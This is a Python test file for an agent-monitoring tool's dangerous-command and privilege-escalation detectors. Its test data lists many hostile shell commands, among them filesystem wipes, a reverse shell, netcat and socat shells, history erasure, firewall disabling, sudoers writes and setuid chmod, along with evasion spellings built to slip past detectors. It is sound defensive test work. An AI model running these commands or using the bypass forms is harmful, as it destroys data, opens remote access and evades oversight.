"""dangerous_command / privilege_escalation: the finding SET is develop's,
only the SEVERITY is tiered.

The detectors flag exactly the commands develop's regexes flag, plus a few
new spellings (rm -fr / -r -f / --recursive --force, /etc/sudoers writes,
setuid chmod with leading zeros or symbolic s). They never drop one. Severity
is chosen by small regex rules on the matched text, with no shell parser and
no attempt to prove a command inert -- so none of the old parser-bypass
regressions (quoting, wrappers, redirects, git -c, ...) can hide a command.
"""

from __future__ import annotations

import re
import time
from datetime import datetime, timezone
from pathlib import Path

import pytest

from agentwatch.detectors.base import Severity, warning_dedup_key
from agentwatch.detectors.registry import SessionScan, create_registry
from agentwatch.detectors.security.privilege import (
    DANGEROUS,
    PRIVILEGE,
    DangerousCommandDetector,
    PrivilegeEscalationDetector,
    analyze_command,
)
from agentwatch.guard import DESTRUCTIVE_PATTERNS
from agentwatch.health.score import calculate_security_score
from agentwatch.parser.models import Action, ActionBuffer, ToolType
from agentwatch.parser.security_patterns import PRIVILEGE_COMMAND_REGEX

CRIT, HIGH, MED = Severity.CRITICAL, Severity.HIGH, Severity.MEDIUM

# develop's exact dangerous_command regex, rebuilt here as the oracle.
_DEV_DANGEROUS = re.compile("|".join([
    *DESTRUCTIVE_PATTERNS, r":\(\)\{:\|:&\};:", r"while\s+true.*fork", r"nc\s+-[el]",
    r"ncat\s+-[el]", r"socat\s+.*EXEC", r"bash\s+-i\s+>&\s*/dev/tcp",
    r"python.*socket.*connect", r"/bin/sh\s+-i", r"history\s+-c", r">\s*~/.bash_history",
    r"shred.*\.bash_history", r"rm.*\.bash_history", r"setenforce\s+0", r"iptables\s+-F",
    r"ufw\s+disable",
]), re.IGNORECASE)


def _sigs(command: str) -> dict[str, Severity]:
    return {f.signal: f.severity for f in analyze_command(command)}


def _sev(command: str, signal: str) -> Severity | None:
    return _sigs(command).get(signal)


def _bash(command: str) -> Action:
    return Action(timestamp=datetime.now(timezone.utc), tool_name="Bash",
                  tool_type=ToolType.BASH, success=True, command=command)


# --- THE SET INVARIANT: every develop match is still a match ----------------
# Corpus from QA #223 plus the old adversarial sets: quoting/comment tricks,
# wrapper and redirect misparses, git -c, data output kept, ...

_CORPUS = [
    "echo $'\\' # '; rm -rf ~", "echo $'a\\' #'; sudo bash",
    "bash -c -- 'rm -rf /'", "bash -c -x 'rm -rf ~'", "sh -c +x 'rm -rf /'",
    "echo 'rm -rf /' > 1; sh 1", "echo 'rm -rf /' >2; bash 2",
    "echo 'rm -rf /' 1<>run.sh; sh run.sh", "{ echo 'rm -rf /'; } > run.sh; sh run.sh",
    "for i in 1; do echo 'rm -rf ~'; done > r.sh; bash r.sh",
    "exec > run.sh; echo 'rm -rf /*'; sh run.sh", "printf -v c 'rm -rf /*'; $c",
    "echo 'rm -rf /' | sort -o run.sh; sh run.sh", "man -P 'rm -rf ~' ls",
    "man --pager='rm -rf ~' ls", "git -c core.pager='rm -rf ~' log",
    "git -c core.sshCommand='rm -rf ~' fetch origin", "git fetch --upload-pack='rm -rf ~' x",
    "git grep -O'rm -rf ~' x", "git -c alias.x='!rm -rf ~' x",
    "gh repo clone o/r -- --upload-pack='rm -rf ~'",
    "rm -rf /etc", "rm -rf /usr", "rm -rf /home", "rm -rf /home/*", "rm -rf /home/alice",
    "rm -rf /Users/alice", "rm -rf /root", "rm -rf ~/.ssh", "rm -rf ~/..", "rm -rf //",
    "rm -rf ${HOME}", "rm -rf $HOME/", "rm -rf -- /", "rm -rf --no-preserve-root /",
    "rm -Rf /", "rm -rf C:/", "rm -rf ./", "rm -rf ../", "rm -rf ../*", "rm -rf .git",
    "rm -rf ~/*", "rm -rf /tmp/x", "rm -rf .pytest_cache", "rm -rf ./build",
    "chmod 00004755 /tmp/rootbash", "chmod 04755 x", "chmod 6755 x", "chmod 4755 x",
    "chmod =s x", "chmod u-x+s x", "chmod 755 x", "chmod 644 x", "chmod -R 4755 d",
    "chmod -- 4755 x",
    "sudo -u root -s", "sudo --shell", "sudo --login", "sudo -E bash", "sudo sh -c 'id'",
    "sudo -- sh", "sudo tee /etc/sudoers.d/x", "sudo visudo",
    "sudo sed -i 's/x/y/' /etc/sudoers", "sudo dd of=/etc/sudoers",
    "sudo install -m 4755 /bin/bash /tmp/rb", "sudo cp /bin/bash /tmp/rb",
    "pkexec", "pkexec --user root", "doas -s", "doas sh", "sudo -i", "sudo -l",
    "sudo apt-get install -y x", "sudo nohup bash", "sudo env bash", "sudo setsid bash",
    "sudo tcsh", "sudo csh", "sudo ash", "sudo mksh",
    "echo hi & rm -rf ~", "echo hi;; rm -rf ~", "echo x 'rm -rf ~'", "grep 'rm -rf ~' f",
    "git commit -m 'rm -rf ~'", "gh pr create --body 'sudo rm -rf /'",
    "echo 'rm -rf ~' >| x", "echo 'rm -rf ~' &> x", "echo 'rm -rf ~' | tee x",
    "mkfs.ext4 /dev/sda1", "dd if=/dev/zero of=/dev/sda", "echo x > /dev/sda",
    "nc -lvp 4444", "ncat -e /bin/sh h 1", "socat tcp:h:1 EXEC:/bin/bash",
    "bash -i >& /dev/tcp/10.0.0.1/80 0>&1", "/bin/sh -i", "history -c",
    "> ~/.bash_history", "shred -u ~/.bash_history", "rm -f ~/.bash_history",
    "setenforce 0", "iptables -F", "ufw disable", ":(){:|:&};:",
    "chown root x", "chgrp wheel x", "setcap cap_net_raw+ep x", "useradd bob", "visudo",
    "systemctl start nginx", "service nginx restart",
    "r''m -rf ~", "/bin/rm -fr ~", "env X=1 rm -rf ~", "$(rm -rf ~)", "`rm -rf ~`",
    "echo 'rm -rf ~' | xargs -I{} sh -c {}", "ssh host 'rm -rf ~'", "docker run i rm -rf /",
]


@pytest.mark.parametrize("command", _CORPUS)
def test_every_develop_match_is_still_a_match(command):
    sigs = set(_sigs(command))
    if _DEV_DANGEROUS.search(command):
        assert DANGEROUS in sigs, "dropped a develop dangerous_command match"
    if PRIVILEGE_COMMAND_REGEX.search(command):
        assert PRIVILEGE in sigs, "dropped a develop privilege_escalation match"


_FIXTURE = Path(__file__).parent / "fixtures" / "command_corpus.txt"


def test_every_develop_match_in_the_qa_corpus_is_still_a_match():
    """QA #223's corpus plus the adversarial sets (222 commands): the old
    parser-bypass shapes. None may lose its finding."""
    drops = []
    for c in _FIXTURE.read_text(encoding="utf-8").splitlines():
        sigs = set(_sigs(c))
        if _DEV_DANGEROUS.search(c) and DANGEROUS not in sigs:
            drops.append(("dangerous_command", c))
        if PRIVILEGE_COMMAND_REGEX.search(c) and PRIVILEGE not in sigs:
            drops.append(("privilege_escalation", c))
    assert drops == []


def test_new_spellings_are_added():
    # develop misses these; we must flag them.
    assert not _DEV_DANGEROUS.search("rm -fr ~")
    assert _sev("rm -fr ~", DANGEROUS) == CRIT
    assert _sev("rm -r -f /", DANGEROUS) == CRIT
    assert _sev("rm --recursive --force $HOME", DANGEROUS) == CRIT
    assert not _DEV_DANGEROUS.search("rm -rf $HOME")
    assert _sev("rm -rf $HOME", DANGEROUS) == CRIT
    assert not PRIVILEGE_COMMAND_REGEX.search("sed -i 's/a/b/' /etc/sudoers")
    assert _sev("sed -i 's/a/b/' /etc/sudoers", PRIVILEGE) == CRIT
    assert _sev("chmod u+s /bin/x", PRIVILEGE) == CRIT


# --- rm severity ------------------------------------------------------------

@pytest.mark.parametrize("command", [
    "rm -rf /", "rm -rf /*", "rm -rf ~", "rm -rf ~/", "rm -rf ~/*", "rm -rf $HOME",
    'rm -rf "$HOME"', "rm --recursive --force ${HOME}", "rm -rf .", "rm -rf ..",
    "rm -rf ./*", "rm -rf /etc", "rm -rf /usr", "rm -rf /var", "rm -rf /home",
    "rm -rf /home/alice", "rm -rf /Users/alice", "rm -rf /lib64", "rm -rf //",
    "rm -fr /", "rm -r -f ~", "rm -Rf /", "rm -rf --no-preserve-root /",
    "rm -rf ~/.ssh", "rm -rf ~/Documents",  # a ~ in the target is not a plain literal
    "rm -rf /tmp/$X", "rm -rf /opt/`id`", "rm -rf /srv/*", "cd /tmp && rm -rf ./*",
    "rm -rf $HOME/proj/build",  # any $ in the target
])
def test_recursive_rm_of_filesystem_target_is_critical(command):
    assert _sev(command, DANGEROUS) == CRIT


@pytest.mark.parametrize("command", [
    "rm -rf /tmp/x", "rm -rf .pytest_cache", "rm -rf ./build",
    "rm -fr /tmp/scratch",
    "rm -rf /var/tmp/cache", "rm -rf ./dist tests/__pycache__", "rm -rf /tmp//x",
    "rm -rf /tmp/./x", "rm -rf ./a/b",
])
def test_recursive_rm_of_ordinary_path_is_high(command):
    assert _sev(command, DANGEROUS) == HIGH


# --- chmod severity ---------------------------------------------------------

@pytest.mark.parametrize("command", [
    "chmod 4755 x", "chmod 2755 d", "chmod 6755 x", "chmod 00004755 x", "chmod 04755 x",
    "chmod u+s /bin/x", "chmod +s x", "chmod =s x", "chmod u-x+s x", "chmod a=rwxs x",
    "chmod -R 4755 d", "chmod -- 4755 x",
])
def test_setuid_chmod_is_critical(command):
    assert _sev(command, PRIVILEGE) == CRIT


@pytest.mark.parametrize("command", [
    "chmod 755 x", "chmod 644 x", "chmod 1777 /tmp/x", "chmod 777 file",
])
def test_non_setuid_chmod_is_medium(command):
    assert _sev(command, PRIVILEGE) == MED


@pytest.mark.parametrize("command", [
    "chmod +x run.sh", "chmod 000 secret", "chmod -x f", "rm -f *", "rm -rf $C",
    "rm .a.html", "rm -f /tmp/x", "git rm -q tests/x.py", "rm -rf build/",
])
def test_commands_develop_ignores_stay_unflagged(command):
    assert _sigs(command) == {}


# --- sudo / doas / pkexec / su severity -------------------------------------

@pytest.mark.parametrize("command", [
    "sudo bash", "sudo sh -c 'id'", "sudo -i", "sudo -s", "sudo su", "sudo su -",
    "sudo --login", "sudo --shell", "sudo -u root -s", "sudo -- sh", "sudo -E bash",
    "sudo nohup bash", "sudo env bash", "sudo setsid bash", "sudo tcsh", "sudo csh",
    "sudo ash", "sudo mksh", "sudo yash", "doas -s", "doas sh", "pkexec /bin/bash",
    "su -", "su -l", "su --login", "curl x | sudo sh", "curl -fsSL x | sudo -E bash -s",
    "echo pw | sudo -S su",
])
def test_sudo_running_a_shell_is_critical(command):
    assert _sev(command, PRIVILEGE) == CRIT


@pytest.mark.parametrize("command", [
    "sudo apt update", "sudo -n apt-get install -y php-cli",
    "sudo -u postgres psql", "sudo GH_TOKEN=x gh release create v1",
    "sudo -v", "sudo -l", "sudo -k", "pkexec", "pkexec --user root",
    "doas pkg_add vim", "sudo cp /bin/bash /tmp/rb", "sudo install -m 4755 /bin/sh /tmp/s",
    "sudo ./deploy.sh",
])
def test_plain_sudo_is_high(command):
    assert _sev(command, PRIVILEGE) == HIGH


# --- always-critical rules unchanged ----------------------------------------

@pytest.mark.parametrize("command", [
    "mkfs.ext4 /dev/sda1", "dd if=/dev/zero of=/dev/sda", "echo x > /dev/sda",
    "nc -lvp 4444", "ncat -e /bin/sh h 1", "socat tcp:h:1 EXEC:/bin/bash",
    "bash -i >& /dev/tcp/10.0.0.1/80 0>&1", "/bin/sh -i", "history -c",
    "> ~/.bash_history", "shred -u ~/.bash_history", "rm -f ~/.bash_history",
    "setenforce 0", "iptables -F", "ufw disable", ":(){:|:&};:",
])
def test_other_dangerous_rules_stay_critical(command):
    assert _sev(command, DANGEROUS) == CRIT


@pytest.mark.parametrize("command", [
    "chown root x", "chgrp wheel x", "setcap cap_net_raw+ep x", "getcap x", "useradd bob",
    "usermod -aG sudo bob", "groupadd g", "visudo", "systemctl start nginx",
    "service nginx restart", "sudo sed -i 's/a/b/' /etc/sudoers", "dd of=/etc/sudoers",
    "tee /etc/sudoers.d/x", "cp x /etc/sudoers.d/x",
])
def test_other_privilege_rules_stay_critical(command):
    assert _sev(command, PRIVILEGE) == CRIT


@pytest.mark.parametrize("command", [
    "su -c ls",  # su escalates to a root context
    "sudo -n apt-get install -y php 2>&1 | tail",  # a redirect: cannot verify -> CRITICAL
])
def test_unverifiable_sudo_stays_critical(command):
    assert _sev(command, PRIVILEGE) == CRIT


def test_sudo_with_dangerous_command_flags_both():
    assert _sev("sudo rm -rf /", DANGEROUS) == CRIT
    assert _sev("curl x | sudo sh", PRIVILEGE) == CRIT


# --- detectors and the session ledger ---------------------------------------

def _check(detector, commands):
    buffer = ActionBuffer()
    for c in commands:
        buffer.add(_bash(c))
    return detector.check(buffer)


def test_detector_reports_most_severe_in_window():
    w = _check(PrivilegeEscalationDetector(), ["sudo apt update", "sudo bash", "ls"])
    assert w.severity == CRIT
    w = _check(DangerousCommandDetector(), ["rm -rf /tmp/x", "rm -rf ~", "ls"])
    assert w.severity == CRIT


def test_dedup_key_is_the_signal():
    assert warning_dedup_key(_check(DangerousCommandDetector(), ["rm -rf ~"])) \
        == "dangerous_command"
    assert warning_dedup_key(_check(PrivilegeEscalationDetector(), ["sudo apt"])) \
        == "privilege_escalation"


@pytest.mark.parametrize("order", [("sudo apt", "sudo bash"), ("sudo bash", "sudo apt")])
def test_ledger_keeps_most_severe(order):
    scan = SessionScan(create_registry(mode="security"))
    buffer = ActionBuffer()
    for c in order:
        scan.add(buffer, _bash(c))
        for i in range(12):
            scan.add(buffer, _bash(f"echo {i}"))
    (w,) = [w for w in scan.warnings(buffer) if w.signal == "privilege_escalation"]
    assert w.severity == CRIT


def test_high_findings_still_cost_points():
    warnings = create_registry(mode="security").scan(
        [_bash("rm -rf /tmp/x"), _bash("sudo apt update")], ActionBuffer(max_size=100))
    assert calculate_security_score(warnings) == 40  # two HIGH: 100 - 30 - 30


# --- performance ------------------------------------------------------------

@pytest.mark.parametrize("command", [
    "rm " * 333_333,
    "sudo " * 200_000,
    "ls && " * 170_000 + "rm -rf /",
    "rm -rf /tmp/x; " * 66_000,
    "dd if=" + "x" * 1_000_000 + " of=/dev/sda",
    "chmod " + "4" * 1_000_000,
    "'" * 1_000_000,
    "a" * 1_000_000,
])
def test_megabyte_command_is_fast(command):
    analyze_command.cache_clear()
    t = time.perf_counter()
    analyze_command(command)
    assert time.perf_counter() - t < 1.0


# --- QA round 2: every occurrence must fit the safe shape -------------------

@pytest.mark.parametrize("command", [
    # chained bypasses: a safe rm next to an unsafe one
    "rm -rf /tmp/x && sudo rm -rf /", "rm -rf /tmp/x; nice rm -rf ~",
    "rm -rf /tmp/x; nice rm -rf /", "rm -rf /tmp/x; command rm -rf /etc",
    "rm -rf build; xargs rm -rf /usr", "rm -rf build | env rm -rf /",
    "rm -rf /tmp/x; rm -rf ~", "rm -rf /tmp/x /etc", "rm -rf /tmp/x -- /",
    "rm /tmp/x -rf /", "rm -rf /tmp/x\t/", "rm -rf /tmp/x /home/alice/",
    "rm -rf ./build ../..", "rm -rf /tmp/x; sudo rm -rf /tmp/y",
    # paths outside /tmp and /var/tmp, however they are spelled
    "rm -rf //etc", "rm -rf /./etc", "rm -rf /etc/./", "rm -rf /usr/bin",
    "rm -rf /var/log", "rm -rf /root/.ssh", "rm -rf /home/alice/.ssh",
    "rm -rf /home/alice/projects", "rm -rf /sys", "rm -rf /mnt", "rm -rf /media",
    "rm -rf /run", "rm -rf /nix", "rm -rf /private/etc", "rm -rf /Applications",
    "rm -rf /mnt/c/Windows", "rm -rf /tmp/../etc", "rm -rf /usr/local/..", "rm -rf /ETC",
    "rm -rf /home//alice", "rm -rf //home/alice", "rm -rf /tmp", "rm -rf /var/tmp",
])
def test_qa2_rm_stays_critical(command):
    assert _sev(command, DANGEROUS) == CRIT


@pytest.mark.parametrize("command", [
    "chmod 755 /tmp/x && nice chmod 4755 /tmp/y", "chmod 755 /tmp/x; chmod 4755 /tmp/y",
    "chmod 666 /etc/shadow", "chmod 777 /etc/sudoers", "chmod 755 /usr/bin/x",
    "chmod 7755 x", "chmod 0004755 /tmp/x", "chmod g=s /tmp/x", "chmod a+rwx,u+s /tmp/x",
    "chmod 777 x; sudo bash",
])
def test_qa2_chmod_stays_critical(command):
    assert _sev(command, PRIVILEGE) == CRIT


@pytest.mark.parametrize("command", [
    "chmod 755 x", "chmod 0755 x", "chmod 00755 x", "chmod 1777 /tmp/x", "chmod 644 a b",
    "chmod 755 -R /tmp/d",
])
def test_qa2_chmod_medium(command):
    assert _sev(command, PRIVILEGE) == MED


@pytest.mark.parametrize("command", [
    # long flags with a value consume the next word
    "sudo --user root bash", "sudo --group wheel sh", "sudo --chdir /tmp sh",
    "sudo --host x sh", "sudo --prompt x sh", "sudo -g wheel bash", "sudo -C 3 bash",
    "sudo -h host bash", "sudo -p x bash", "sudo -uroot bash", "sudo -nu root bash",
    "sudo -k -u root bash", "sudo -D /tmp bash", "sudo -R /x bash", "sudo -T 5 bash",
    "sudo --preserve-env bash", "sudo --preserve-env=PATH bash", "sudo -u root -- bash",
    "doas -u root bash", "doas -C /etc/doas.conf bash", "pkexec --user root sh",
    "pkexec --user root /usr/bin/python3",
    # edit, nested elevators, escape helpers, versioned interpreters
    "sudo -e /etc/passwd", "sudo -e /etc/sudoers", "sudo sudoedit /etc/sudoers",
    "sudo sudo -s", "sudo doas sh", "sudo su", "sudo busybox sh", "sudo python3.12",
    "sudo perl5.36", "sudo ex", "sudo view /etc/hosts", "sudo ipython", "sudo pwsh",
    "sudo script", "sudo crontab -e", "sudo git -p help config", "sudo socat - exec:sh",
    "sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=sh",
    "sudo ionice bash", "sudo nice -n 5 bash", "sudo stdbuf -o0 bash", "env A=1 sudo ls",
    # chained
    "sudo -s; ls", "ls; sudo bash", "ls && sudo -u root bash", "su root", "su - root",
])
def test_qa2_sudo_stays_critical(command):
    sev = _sev(command, PRIVILEGE)
    assert sev in (CRIT, None)  # None only when develop does not flag it at all
    if PRIVILEGE_COMMAND_REGEX.search(command):
        assert sev == CRIT


@pytest.mark.parametrize("command", [
    "sudo apt install foo", "sudo -l", "sudo -n apt-get install -y php",
    "sudo -u postgres psql", "sudo --user=postgres psql",
])
def test_qa2_plain_sudo_is_high(command):
    assert _sev(command, PRIVILEGE) == HIGH


@pytest.mark.parametrize("command", [
    "sudo tee /etc/sudoers.d/x", "echo hi | sudo tee /etc/sudoers",
    "sudo cp /tmp/x /etc/sudoers.d/x", "sed -i s/a/b/ /etc/sudoers", "dd of=/etc/sudoers",
    "echo x >> /etc/sudoers.d/x",
])
def test_sudoers_writes_are_critical(command):
    assert _sev(command, PRIVILEGE) == CRIT


def _rep(s: str, n: int = 1_000_000) -> str:
    return (s * (n // len(s) + 1))[:n]


@pytest.mark.parametrize("command", [
    "sudoers " + _rep("sed -i "), "sudoers " + _rep("cp /"), "sudoers " + _rep("tee /"),
    _rep("tee /etc/sudoers "), _rep("> /etc/sudoers"), _rep("sed -i x ", 999_980) + "/etc/sudoers",
    "sudo " + _rep("> /etc/", 999_980) + "x", _rep("rm -rf a "), _rep("rm -r -f "),
    "rm" + _rep(" -x", 999_998), "chmod" + _rep(" -R", 999_995), _rep("chmod 4"),
    _rep("sudo -u "), _rep("sudo -"), _rep(";", 999_990) + "rm -rf /x",
    _rep("&&", 999_994) + " sudo", _rep("|", 999_990) + "chmod 755",
    "rm -rf " + _rep("${HOME}/", 999_993), _rep("su -"), _rep("doas "),
])
def test_qa2_megabyte_shapes_are_fast(command):
    analyze_command.cache_clear()
    t = time.perf_counter()
    analyze_command(command)
    assert time.perf_counter() - t < 0.5
